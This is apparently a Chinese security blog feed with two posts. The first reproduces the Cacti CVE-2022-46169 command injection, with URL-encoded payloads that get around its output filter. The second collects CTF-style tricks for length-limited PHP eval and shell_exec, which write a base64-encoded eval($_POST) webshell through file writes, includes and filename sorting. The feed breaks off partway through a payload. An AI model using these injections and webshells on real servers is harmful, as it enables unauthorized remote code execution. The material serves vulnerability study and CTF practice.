二进制执行，然后与目标执行的 PHP 脚本路径进行拼接，然后又与 <code>$poller_id</code> 拼接，最终执行了我们的rce</p><p>接下来我们倒着分析回去</p><p>看看如何让他进入这个分支</p><p><code>POLLER_ACTION_SCRIPT_PHP</code> 想让他进入这个分支，</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725202424473.png" alt="image-20250725202424473"></p><p>全局搜索发现这个的值为2</p><p>所以说这里我们 需要找到对应的action &#x3D; 2 的时候</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725203039500.png" alt="image-20250725203039500"></p><p>往上发现，他这里的action 是通过items 这个值传入的</p><p>也就是他会在数据库去查询，查询到这个action为2的</p><p>才会进入我们想要的分支</p><p>也就是说，我们需要控制 <code>host_id</code> 和<code>local_data_id</code> 这两个的值，让他代入去数据库中查询，精确查找出这个action&#x3D;2，</p><p>然后我们去 连接一下数据库查询一下 poller_item 这个字段</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725203659403.png" alt="image-20250725203659403"></p><p>查询后发现，只有 id&#x3D;6的时候这个action才是2</p><p>所以这个时候，我们只需要拿出 <code>host_id</code> 和<code>local_data_id</code> 这两个的值</p><p>host_id &#x3D; 1 </p><p>local_data_id &#x3D; 6</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725203844668.png" alt="image-20250725203844668"></p><p>然后他就会进入这个进行循环，这时候这个action 就是2 ，也就成功进入了我们的分支</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725204401780.png" alt="image-20250725204401780"></p><p>然后这里我们 local_data_ids 必须传入一个数组，不然他进这里这个循环就会报错</p><p>所以这里我们传的<code>local_data_ids[0]=6</code></p><p>最后她走到我们的proc_open这里执行任意的函数，我们的rce 也生效了</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725204554766.png" alt="image-20250725204554766"></p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725204626198.png" alt="image-20250725204626198"></p><p>但是这里他没有回显</p><p>我们继续深入研究一下，让他怎么才有回显</p><h4 id="如何回显"><a href="#如何回显" class="headerlink" title="如何回显"></a>如何回显</h4><p>我们知道<code>proc_open</code> 这个函数 能通过管道来输出，输入</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725211924880.png" alt="image-20250725211924880"></p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725211846268.png" alt="image-20250725211846268"></p><p>这里正好他用fgets 从管道里面读取了1024个字节</p><p>然后他就会进入</p><p><code>using_proc_function</code></p><p> 这个判断里面</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725212101793.png" alt="image-20250725212101793"></p><p><code>$output = trim(str_replace(&quot;\n&quot;, &#39;&#39;, exec_poll_php($item[&#39;arg1&#39;], $using_proc_function, $pipes, $cactiphp)));</code></p><p>这里他先用exec_poll_php 执行了一个php脚本</p><p>然后str_replace 去除结果中的换行符（<code>\n</code>），</p><p>trim去除前后空白字符（包括空格、制表符等）</p><p>进入看看<code>exec_poll_php</code> 具体干了些什么</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725215622178.png" alt="image-20250725215622178"></p><p>我们看到，他这里读了8192个字节，是否会将我们的执行结果也一起读出来呢？</p><p><code>prepare_validate_result</code></p><p>这个函数对<code>output</code> 做了过滤</p><p>为false，就会直接将output 赋值为‘U’，所以我们要想办法绕过</p><p>进入进行分析</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725212656843.png" alt="image-20250725212656843"></p><p>这里他先去掉了首尾的 单引号，双引号，换行符，回车</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (is_numeric($result)) &#123;</span><br><span class="line">dsv_log(&#x27;prepare_validate_result&#x27;,&#x27;data is numeric&#x27;);</span><br><span class="line"> return true;</span><br></pre></td></tr></table></figure><p>这里他判断是否是纯数字，是就直接返回true，但是这里我们的$output不可能是纯数字，所以直接pass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">elseif ($result == &#x27;U&#x27;) &#123;</span><br><span class="line">dsv_log(&#x27;prepare_validate_result&#x27;, &#x27;data is U&#x27;);</span><br><span class="line">return true;</span><br></pre></td></tr></table></figure><p>这里他判断值是不是U，不可能，也pass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">elseif (is_hexadecimal($result)) &#123;</span><br><span class="line">dsv_log(&#x27;prepare_validate_result&#x27;, &#x27;data is hex&#x27;);</span><br><span class="line">return hexdec($result);</span><br></pre></td></tr></table></figure><p>这里看函数名像判断16进制，有可能，保留，（因为我们可以将输出结果通过管道符 转化为16进制）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">elseif (substr_count($result, &#x27;:&#x27;) || substr_count($result, &#x27;!&#x27;)) &#123;</span><br><span class="line">/* looking for name value pairs */</span><br><span class="line">if (substr_count($result, &#x27; &#x27;) == 0) &#123;</span><br><span class="line">dsv_log(&#x27;prepare_validate_result&#x27;, &#x27;data has no spaces&#x27;);</span><br><span class="line">return true;</span><br></pre></td></tr></table></figure><p>这里先判断是否包含冒号（:）或感叹号（!），</p><p>在判断如果没有空格，就返回true，也有可能保留</p><p>最后一个else 里面直接将非数字字符全部清除了，只保留数字，pass</p><p>所以我们的目标就落在了</p><p><code>elseif (is_hexadecimal($result))</code></p><p><code>lseif (substr_count($result, &#39;:&#39;) || substr_count($result, &#39;!&#39;)) &#123; if (substr_count($result, &#39; &#39;) == 0) &#123;</code></p><p>这两个判断里面，先分析16进制</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725213756651.png" alt="image-20250725213756651"></p><p>1.清洗输入</p><p><code>$hexstr = str_replace(array(&#39; &#39;, &#39;-&#39;), &#39;:&#39;, trim($result));</code></p><p>他先将输入字符串中的 空格和中划线（如 <code>&quot;00-1A-2B&quot;</code> 或 <code>&quot;00 1A 2B&quot;</code>）统一转换为 冒号分隔（如 <code>&quot;00:1A:2B&quot;</code>）。</p><p>并用 <code>trim</code> 去除前后空白字符。</p><p>2.按冒号分隔为数组</p><p><code>$parts = explode(&#39;:&#39;, $hexstr);</code></p><p>将统一格式的字符串切成数组</p><p>例如输入 <code>&quot;00:1A:2B:3C:4D:5E&quot;</code> → <code>[&quot;00&quot;, &quot;1A&quot;, &quot;2B&quot;, &quot;3C&quot;, &quot;4D&quot;, &quot;5E&quot;]</code></p><p>3.逐个检查每段是否为合法的两位十六进制数</p><p><code>foreach($parts as $part) &#123;</code><br><code>if (strlen($part) != 2) return false;</code><br><code>if (ctype_xdigit($part) == false) return false;</code><br><code>&#125;</code></p><p>每段必须是 长度为 2 的字符串，例如 <code>&quot;0F&quot;</code>, <code>&quot;1a&quot;</code>。</p><p>必须全部是 十六进制字符（0-9, A-F, a-f），否则返回 <code>false</code>。</p><p>所有部分都符合条件，返回 <code>true</code>，表示是合法的十六进制格式。</p><p>然后我们就要想办法 如何将输出的结果转换为 类似于mac地址这种的格式</p><p>问问大模型，给了4种方法</p><ol><li><p>使用 <code>xxd</code> + <code>sed</code> 或 <code>awk</code>（处理二进制&#x2F;十六进制数据）</p><p><code>echo -n &quot;abcdef&quot; | xxd -p | sed &#39;s/\(..\)/\1:/g; s/:$//&#39;</code></p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725214705152.png" alt="image-20250725214705152"></p><p>本地测试有效果</p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725214725146.png" alt="image-20250725214725146"></p><p>docker环境内显示没有xdd，所以这个有可能可以用</p></li><li><p>使用 <code>hexdump</code></p><p><code>echo -n &quot;abcdef&quot; | hexdump -v -e &#39;1/1 &quot;%02x:&quot;&#39; | sed &#39;s/:$//&#39;</code></p><p>这个跟上面的一样，也有可能环境中没有这个命令</p></li><li><p>用 <code>xxd</code> 处理文件并转换格式</p><p><code>xxd -p /bin/ls | tr -d &#39;\n&#39; | sed &#39;s/\(..\)/\1:/g; s/:$//&#39;</code></p><p>pass，跟第一种差不多</p></li><li><p>用 Bash + printf</p><p><code>hex=&quot;001a2b3c4d5e&quot;</code><br><code>echo &quot;$hex&quot; | sed &#39;s/../&amp;:/g; s/:$//&#39;</code></p><p>第四种直接pass，因为我们不能保证原文本就是十六进制的字符串</p></li></ol><p>所以我们找到了两种有效的方式，可以转16进制</p><p>然后分析下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">elseif (substr_count($result, &#x27;:&#x27;) || substr_count($result, &#x27;!&#x27;)) &#123;</span><br><span class="line">/* looking for name value pairs */</span><br><span class="line">if (substr_count($result, &#x27; &#x27;) == 0) &#123;</span><br><span class="line">dsv_log(&#x27;prepare_validate_result&#x27;, &#x27;data has no spaces&#x27;);</span><br><span class="line">return true;</span><br></pre></td></tr></table></figure><p>如何让我们的输出包含<code>：</code>或者<code>！</code> 且还没有空格呢？</p><p>第一个判断很好绕过，我们直接传一个冒号或者感叹号就行。</p><p>第二个也很好想到，通过base64编码。</p><p>问了问大模型</p><ol><li>使用 <code>tr</code> 删除所有空格</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|echo &quot;test\r\n :`id | tr -d &#x27; &#x27;`&quot;;</span><br><span class="line">转一下 urlencode</span><br><span class="line">%7Cecho%20%22test%5Cr%5Cn%20:%60id%20%7C%20tr%20-d%20&#x27;%20&#x27;%60%22;</span><br></pre></td></tr></table></figure><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725225350740.png" alt="image-20250725225350740"></p><p>成功</p><ol start="2"><li><p>使用 <code>sed</code> 删除所有空格字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test\r\n :`id | sed &#x27;s/ //g&#x27;`&quot;;</span><br><span class="line">转一下 urlencode</span><br><span class="line">%7Cecho%20%22test%5Cr%5Cn%20:%60id%20%7C%20sed%20&#x27;s/%20//g&#x27;%60%22;</span><br></pre></td></tr></table></figure><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725225725218.png" alt="image-20250725225725218"></p><p>没问题</p></li><li><p>删除所有空白字符（包括空格、制表符、换行符）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|echo &quot;test\r\n :`id | tr -d &#x27;[:space:]&#x27;`&quot;;</span><br><span class="line">|echo &quot;test\r\n :`id | sed &#x27;s/[[:space:]]//g&#x27;`&quot;;</span><br></pre></td></tr></table></figure><p>道理跟前两种差不多</p><p>也可以执行，这里就不贴图了</p></li><li><p>base 64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|echo &quot;test\r\n :`id | base64`&quot;;</span><br></pre></td></tr></table></figure><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725230541249.png" alt="image-20250725230541249"></p><p><img src="/2025/07/25/cacti-CVE-2022-46169/image-20250725230549777.png" alt="image-20250725230549777"></p><p>成功</p></li></ol><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>rce 执行归结于 <code>proc_open</code>函数  他直接进行了拼接，且未对我们用户的输入做过滤，导致了rce</p><p>鉴权函数也可以优化，最简单的方法就是改变一下那个数组的顺序，将用户不能控制的ip放在最前面，让他循环一次就会直接判断</p><p>而且他这个回显的过滤也很好绕过。</p><p>但是终归还是没对用户的输入做过滤</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CVE-2022-46169 的rce 漏洞复现&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="RCE" scheme="https://heisha123.github.io/tags/RCE/"/>
    
    <category term="代码审计" scheme="https://heisha123.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>rce的一些奇技淫巧</title>
    <link href="https://heisha123.github.io/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    <id>https://heisha123.github.io/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/</id>
    <published>2025-07-23T09:19:26.000Z</published>
    <updated>2025-07-25T15:17:23.732Z</updated>
    
    <content type="html"><![CDATA[<p>EVAL长度限制突破技巧</p><span id="more"></span><h5 id="PHP-Eval函数参数限制在16个字符的情况下，如何拿到Webshell？"><a href="#PHP-Eval函数参数限制在16个字符的情况下，如何拿到Webshell？" class="headerlink" title="PHP Eval函数参数限制在16个字符的情况下，如何拿到Webshell？"></a>PHP Eval函数参数限制在16个字符的情况下，如何拿到Webshell？</h5><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$param = $_REQUEST[&#x27;param&#x27;];</span><br><span class="line">if (</span><br><span class="line">strlen($param) &lt; 17 &amp;&amp; stripos($param, &#x27;eval&#x27;) === false &amp;&amp; stripos($param, &#x27;assert&#x27;) === false</span><br><span class="line">) </span><br><span class="line">&#123;</span><br><span class="line">eval($param);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723172109903.png" alt="image-20250723172109903"></p><p>这里其实很容易想到利用<code>$_GET[1]</code> </p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?param=echo%20`$_GET[1]`;&amp;1=whoami</span><br></pre></td></tr></table></figure><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723173601674.png" alt="image-20250723173601674"></p><p>还有一种方法呢就是利用exec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?param=exec($_GET[1]);</span><br></pre></td></tr></table></figure><p>其实核心都是<code>$_GET[1]</code></p><p>这里还有另一种解法，利用文件包含</p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723174057360.png" alt="image-20250723174057360"></p><h6 id="远程文件包含的利用"><a href="#远程文件包含的利用" class="headerlink" title="远程文件包含的利用"></a>远程文件包含的利用</h6><p><code>include$_GET[1];</code>也是可以运行的，中间的空格可以不要。</p><p>这也是一个思路，但限制就是需要开启远程文件包含，但这个选项默认是关闭的。</p><h6 id="本地文件包含的利用"><a href="#本地文件包含的利用" class="headerlink" title="本地文件包含的利用"></a>本地文件包含的利用</h6><p>那么，文件包含真的不行么？</p><p>有一种思路，利用file_put_contents可以将字符一个个地写入一个文件中，大概请求如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param=$_GET[a](N,a,8);&amp;a=file_put_contents</span><br></pre></td></tr></table></figure><p>file_put_contents的第一个参数是文件名，我传入N。PHP会认为N是一个常量，但我之前并没有定义这个常量，于是PHP就会把它转换成字符串’N’；第二个参数是要写入的数据，a也被转换成字符串’a’；第三个参数是flag，当flag&#x3D;8的时候内容会追加在文件末尾，而不是覆盖。【因为默认是0 ，0是覆盖，8是追加】</p><p>开始测试</p><p>结果发现</p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723175922187.png" alt="image-20250723175922187"></p><p>权限不足，忘记改html为www:data,权限了</p><p>执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown www-data:www-data /var/www/html</span><br></pre></td></tr></table></figure><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723180024341.png" alt="image-20250723180024341"></p><p>除了file_put_contents，error_log函数效果也类似。</p><p>但这个方法有个问题，就是file_put_contents第二个参数如果是符号，就会导致PHP出错，比如<code>param=$_GET[a](N,&lt;,8);&amp;a=file_put_contents</code>。但如果要写webshell的话，“&lt;”等符号又是必不可少的。</p><p>那么我们每次向文件’N’中写入一个字母或数字，最后构成一个base64字符串，再包含的时候使用php:&#x2F;&#x2F;filter对base64进行解码即可。</p><p>最后请求如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 每次写入一个字符：PD9waHAgZXZhbCgkX1BPU1RbMV0pOw   //&lt;?php eval($_POST[1]);</span><br><span class="line"># 最后包含</span><br><span class="line">param=include$_GET[0];&amp;0=php://filter/read=convert.base64-decode/resource=N</span><br></pre></td></tr></table></figure><p>我们用蚁剑 连接试试</p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723180625969.png" alt="image-20250723180625969"></p><p>成功getshell。</p><p>然后这里看了P神的文章发现还可以利用以下几个方式</p><h6 id="本地日志包含"><a href="#本地日志包含" class="headerlink" title="本地日志包含"></a>本地日志包含</h6><p>首先通过各种方法找到web日志，然后利用上面说的include的方式来包含之。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param=include$_GET[a];&amp;a=/home/u244201241/.logs/php_error.log</span><br></pre></td></tr></table></figure><p>如果找不到web日志，利用条件竞争的方法，包含tmp文件也可以。</p><h6 id="标准答案：利用变长参数特性展开数组"><a href="#标准答案：利用变长参数特性展开数组" class="headerlink" title="标准答案：利用变长参数特性展开数组"></a>标准答案：利用变长参数特性展开数组</h6><p>变长参数是PHP5.6新引入的特性，文档在此： <a href="http://php.net/manual/zh/migration56.new-features.php">http://php.net/manual/zh/migration56.new-features.php</a></p><p>和Python中的<code>**kwargs</code>，类似，在PHP中可以使用 <code>func(...$arr)</code>这样的方式，将<code>$arr</code>数组展开成多个参数，传入func函数。</p><p>再结合回调后门，即可构造一个完美的利用，数据包如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php?1[]=test&amp;1[]=var_dump($_SERVER);&amp;2=assert HTTP/1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">param=usort(...$_GET);</span><br></pre></td></tr></table></figure><p>效果图：</p><p><a href="https://www.leavesongs.com/content/uploadfile/201701/77d21484750770.jpg"><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/thum-77d21484750770.jpg" alt="14847507412871.jpg"></a></p><p>大概过程就是，GET变量被展开成两个参数<code>[&#39;test&#39;, &#39;phpinfo();&#39;]</code>和<code>assert</code>，传入usort函数。usort函数的第二个参数是一个回调函数<code>assert</code>，其调用了第一个参数中的<code>phpinfo();</code>。修改<code>phpinfo();</code>为webshell即可。</p><p>也就是我上一篇文章细致的研究过</p><h5 id="Linux命令长度限制在7个字符的情况下，如何拿到shell"><a href="#Linux命令长度限制在7个字符的情况下，如何拿到shell" class="headerlink" title="Linux命令长度限制在7个字符的情况下，如何拿到shell"></a>Linux命令<strong>长</strong>度限制在7个字符的情况下，如何拿到shell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在二进制漏洞利用中，某师傅遇到可控数据只有8字节的情况，去掉字符串尾的\0，限制在7个字符。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$param = $_REQUEST[&#x27;param&#x27;]; </span><br><span class="line">if ( strlen($param) &lt; 8 )</span><br><span class="line">&#123; </span><br><span class="line">     echo shell_exec($param);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看了来自 @超威蓝猫 px1624 师傅的奇技淫巧。</p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723181230904.png" alt="image-20250723181230904"></p><p>在Linux下 W&gt;hp,可以直接写入文件名为hp的文件</p><p>其实这里也可以不用w，直接 &gt;hp,也可以，</p><p>而且在Linux下 <code>ls -t</code> 这个可以安装时间顺序进行排序，也就是我们先创建的文件会排最下面，越晚创建的文件会排在最上面</p><p>这里为什么要引入<code>\</code> 呢？ 就是为了转义ls 的换行符，因为我们只能7个字符慢慢写，还没写完，所以引入转义字符，就可以接着写啦，</p><p>这里我们也不能直接写入<code>&lt;</code> 测试发现会报错</p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723182007487.png" alt="image-20250723182007487"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOw |base64 -d&gt;c.php</span><br><span class="line">//&lt;?php eval($_POST[1]);</span><br></pre></td></tr></table></figure><p>我们来尝试写入这个命令</p><p>因为先写的在最后面，所以我们要倒着写</p><p>这里还是要注意权限的问题</p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723182500233.png" alt="image-20250723182500233"></p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723182940024.png" alt="image-20250723182940024"></p><p>写入完毕</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -t&gt;0</span><br></pre></td></tr></table></figure><p>将他排序后的结果重定向给0</p><p>然后执行</p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723184238033.png" alt="image-20250723184238033"></p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723184256399.png" alt="image-20250723184256399"></p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723184302522.png" alt="image-20250723184302522"></p><p>连接也没有任何的问题</p><h5 id="五字符"><a href="#五字符" class="headerlink" title="五字符"></a>五字符</h5><p>5字符我们如何拿到webshell呢？</p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(strlen($_GET[&#x27;cmd&#x27;])&lt;=5 &amp;&amp; !preg_match(&#x27;/rm/&#x27;,$_GET[&#x27;cmd&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    echo shell_exec($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里其实我们也可以用刚刚7字符的思路</p><p>通过 <code>&gt;</code> 写入文件名来执行命令</p><p>这里引入了一个新的参数 <code>ls -h</code> </p><p><code>-h参数以易读的方式显示文件或目录大小</code></p><p>就比如我们构建的 <code>ls -t &gt; a</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;a\&gt;</span><br><span class="line">&gt;t-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723201455590.png" alt="image-20250723201455590"></p><p>因为ls是默认按照字母顺序来排序的，所以添上-h是为了让命令以正常的顺序运行</p><p>所以这里我们 将 <code>&gt;t-</code> 替换为 <code>&gt;ht-</code></p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723201648294.png" alt="image-20250723201648294"></p><p>ls写入文件中时，每个文件名都是单独一行，它会自动换行，有时会影响到我们的命令执行，而dir会把内容全部写入一行中，同时会自动补全空格</p><p>例如</p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723201821161.png" alt="image-20250723201821161"></p><p>这里还有一个知识点</p><p><code>*</code> 的用法</p><p>在Linux中<code>*</code> 大家都知道可以作为通配符使用，但是他也可以作为 命令来执行</p><p>比如</p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723202106910.png" alt="image-20250723202106910"></p><p>这里 我们可以看到<code>* &gt; v</code> 成功 将dir的结果重定向到v中了，这是为什么呢？</p><p>查询资料后发现</p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723202340865.png" alt="image-20250723202340865"></p><p>正好我们这里的第一个是dir</p><p>我们还可以做一个测试</p><p>追加一个 <code>&gt;a</code> 这样第一个就不是dir了，也就可以看到是否是执行dir</p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723202446925.png" alt="image-20250723202446925"></p><p>爆了a没找到，印证我们的看法</p><p>然后我们继续</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">每个都是一个文件</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v        </span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;a        </span><br><span class="line">sh a        最后用sh来执行命令</span><br></pre></td></tr></table></figure><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723202611194.png" alt="image-20250723202611194"></p><p>按道理来说，按照我们前面的想法，这里*应该匹配 dir，他为什么匹配到 rev了呢？</p><p>我们可以设置一下，让shell，打印我们所执行的命令，看看他到底是匹配的什么</p><p><code>set -x</code> 执行这条命令</p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723203036906.png" alt="image-20250723203036906"></p><p>确实是先匹配的rev 并执行的</p><p>也就是说，形如*v 这样的 他会先将 符合 这个通配符的全部文件列出来，然后取第一个再进行命令执行</p><p>接下来就可以开始拆分字符串了，第一种可以直接构造一句话木马,因为有<code>&lt;,?</code>，需要将其进行base64转换，这样payload里就没有特殊字符了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">写入一句话木马 